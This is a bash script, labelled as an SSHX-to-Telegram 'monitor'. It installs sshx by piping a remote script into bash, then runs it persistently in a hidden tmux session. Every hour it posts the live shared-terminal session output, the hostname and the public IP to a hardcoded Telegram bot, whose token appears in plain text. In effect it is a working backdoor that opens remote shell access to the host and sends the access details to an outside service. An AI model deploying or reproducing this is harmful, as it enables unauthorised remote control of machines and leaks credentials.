#!/bin/bash
# ============================================
# SSHX → TELEGRAM MONITOR (FINAL)
# ============================================

set -e

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

log(){ echo "[INFO] $1"; }

send_telegram(){
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d "chat_id=$CHAT_ID" \
-d "text=$1" \
-d "parse_mode=HTML" > /dev/null
}

# ============================================
# DETECT OS
# ============================================

detect_os(){

if [ -f /etc/os-release ]; then
. /etc/os-release
OS=$ID
fi

case $OS in
ubuntu|debian)
PKG_UPDATE="apt-get update -y"
PKG_INSTALL="apt-get install -y"
;;

centos|rhel|almalinux)
PKG_UPDATE="yum makecache -y"
PKG_INSTALL="yum install -y"
;;

fedora)
PKG_UPDATE="dnf makecache -y"
PKG_INSTALL="dnf install -y"
;;

alpine)
PKG_UPDATE=""
PKG_INSTALL="apk add"
;;

arch)
PKG_UPDATE="pacman -Sy"
PKG_INSTALL="pacman -S --noconfirm"
;;

*)
PKG_UPDATE="apt-get update -y"
PKG_INSTALL="apt-get install -y"
;;
esac

}

# ============================================
# INSTALL DEPENDENCIES
# ============================================

install_deps(){

[ -n "$PKG_UPDATE" ] && $PKG_UPDATE

command -v curl >/dev/null || $PKG_INSTALL curl
command -v tmux >/dev/null || $PKG_INSTALL tmux

if ! command -v sshx >/dev/null; then
log "install sshx"
curl -fsSL https://sshx.io/get | bash
fi

export PATH=$PATH:$HOME/.sshx/bin

}

# ============================================
# CREATE MONITOR
# ============================================

create_monitor(){

cat > /usr/local/bin/sshx-monitor.sh << 'EOF'
#!/bin/bash

BOT_TOKEN="8388395050:AAF6ReXoj_FRS7d0AMoxoO-w0YNuKIB2rKA"
CHAT_ID="-1003847935504"

send(){
curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
-d "chat_id=$CHAT_ID" \
-d "text=$1" \
-d "parse_mode=HTML" > /dev/null
}

report(){

HOST=$(hostname)
IP=$(curl -s ifconfig.me)
DATE=$(date)

OUTPUT=$(sshx --quiet 2>&1)

MSG="🔥 <b>SSHX SESSION</b>

Host: $HOST
IP: $IP
Time: $DATE

<code>$OUTPUT</code>"

send "$MSG"

}

report

while true
do
sleep 3600
report
done

EOF

chmod +x /usr/local/bin/sshx-monitor.sh

}

# ============================================
# RUN TMUX
# ============================================

run_tmux(){

tmux kill-session -t sshx-monitor 2>/dev/null || true
tmux new-session -d -s sshx-monitor "bash /usr/local/bin/sshx-monitor.sh"

}

# ============================================
# MAIN
# ============================================

main(){

detect_os
install_deps
create_monitor
run_tmux

send_telegram "✅ <b>SSHX MONITOR STARTED</b>
Host: $(hostname)
IP: $(curl -s ifconfig.me)
Time: $(date)"

log "SSHX monitor running"
log "tmux attach -t sshx-monitor"

}

main
